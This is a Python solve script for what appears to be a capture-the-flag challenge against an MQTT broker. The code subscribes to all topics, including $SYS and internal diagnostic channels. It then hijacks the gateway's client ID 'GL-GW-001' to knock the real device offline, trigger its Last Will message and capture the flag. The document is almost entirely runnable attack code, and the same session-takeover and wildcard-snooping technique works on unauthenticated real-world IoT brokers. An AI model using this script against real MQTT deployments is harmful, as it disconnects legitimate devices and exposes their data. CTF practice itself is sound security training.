#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time, re, threading
HOST, PORT = "0.cloud.chals.io", 28208
FLAG = re.compile(rb"KPMG_CTF\{[^}]*\}")
hits = []

def on_msg(c, u, m):
    if m.topic.startswith("plant/sensors/"):
        return
    try: d = m.payload.decode()
    except: d = m.payload.hex()
    print(f"[{'R' if m.retain else ' '}] {m.topic} = {d!r}")
    g = FLAG.search(m.payload)
    if g:
        print("\n*** FLAG ***", g.group(0).decode(), "\n")
        hits.append(g.group(0).decode())

# --- subscriber first (catch the Will the instant it fires) ---
sub = mqtt.Client(client_id="ops-listener", clean_session=True)
sub.on_message = on_msg
sub.connect(HOST, PORT, 30)
for t in ["plant/gateway/#", "plant/gateway/heartbeat_lost", "#",
          "$SYS/#", "$internal/#", "$internal/diagnostics/#", "$diag/#"]:
    sub.subscribe(t)
sub.loop_start()
time.sleep(2)
print("[*] subscriber ready; taking over client id GL-GW-001 to trigger the gateway's Last Will...")

# --- takeover: connect with the gateway's own client id to kick it ---
def takeover(cid):
    atk = mqtt.Client(client_id=cid, clean_session=True)
    atk.connect(HOST, PORT, 30)
    atk.loop_start()
    time.sleep(4)
    atk.loop_stop(); atk.disconnect()

takeover("GL-GW-001")
time.sleep(3)
# some brokers only fire the will after the kicked client's keepalive; re-take a couple times
for cid in ["GL-GW-001", "GL-GW-001"]:
    if hits: break
    takeover(cid); time.sleep(3)

time.sleep(2)
sub.loop_stop()
print("\n[done] flag(s):", hits or "none yet")
